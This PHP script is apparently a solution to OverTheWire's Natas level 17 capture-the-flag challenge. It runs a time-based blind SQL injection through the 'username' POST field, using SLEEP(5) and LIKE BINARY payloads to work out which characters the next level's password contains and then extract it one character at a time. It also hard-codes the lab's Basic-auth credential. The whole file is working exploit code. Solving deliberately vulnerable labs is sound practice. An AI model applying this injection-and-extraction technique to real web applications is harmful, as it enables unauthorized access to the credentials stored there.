<?php

$authorization = base64_encode("natas17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd");
$url = "http://natas17.natas.labs.overthewire.org/index.php?debug";
$valid_time = 5;

function verify($inyection)
{
    global $authorization;
    global $url;
    global $valid_time;

    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n" .
                "Authorization: Basic $authorization\r\n",
            'method' => 'POST',
            'content' => http_build_query(['username' => $inyection]),
        ],
    ];

    $context = stream_context_create($options);

    $time_pre = microtime(true);
    file_get_contents($url, false, $context);
    $time_post = microtime(true);

    return ($time_post - $time_pre) > $valid_time;
}

function contains_inyection($substring)
{
    return "natas18\" AND password LIKE BINARY \"%$substring%\" AND SLEEP(5) != \"";
}

function startwith_inyection($start)
{
    return "natas18\" AND password LIKE BINARY \"$start%\" AND SLEEP(5) != \"";
}


function equals_inyection($password)
{
    return "natas18\" AND password LIKE BINARY \"$password\" AND SLEEP(5) != \"";
}


$alphabet = array_merge(range('A', 'Z'), range('a', 'z'), range(0, 9));
$filtered = array();

echo "Filtering characters...\n\n";

foreach ($alphabet as $letter) {
    echo "- Checking $letter.";
    if (verify(contains_inyection($letter))) {
        echo " Contained!\n";
        $filtered[] = $letter;
    } else {
        echo "\n";
    }
}

echo "\nFiltered characters: " . join("", $filtered) . "\n";

echo "Bruteforcing password...\n\n";

$password = "";
while (!verify(equals_inyection($password))) {
    echo "Current password: $password\n";
    foreach ($filtered as $letter) {
        echo "- Checking $password$letter";
        if (verify(startwith_inyection($password . $letter))) {
            echo " - Correct!\n";
            $password .= $letter;
            break;
        } else {
            echo "\n";
        }
    }
}

echo "\nFinal password: $password\n";
